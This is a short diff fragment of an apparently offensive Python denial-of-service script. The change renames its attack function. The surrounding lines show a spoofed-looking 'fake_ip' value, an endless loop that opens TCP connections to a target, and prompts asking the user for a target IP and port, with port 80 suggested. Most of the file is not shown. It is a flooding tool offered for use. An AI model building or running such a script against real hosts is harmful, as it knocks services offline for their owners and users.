@@ -9,7 +9,7 @@ import threading
 import time
 fake_ip = '44.197.175.168'
 attack_num = 0
-def attack(target, port):
+def Attack(target, port):
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((target, port))
@@ -102,7 +102,7 @@ def main():
         print("/_/     /_____/\____/____/  ")
         target = raw_input("Target IP: ")
         port = int(input("Target Port (80 suggested): "))
-        attack(target, port)
+        Attack(target, port)
 
 
 if __name__ == "__main__":
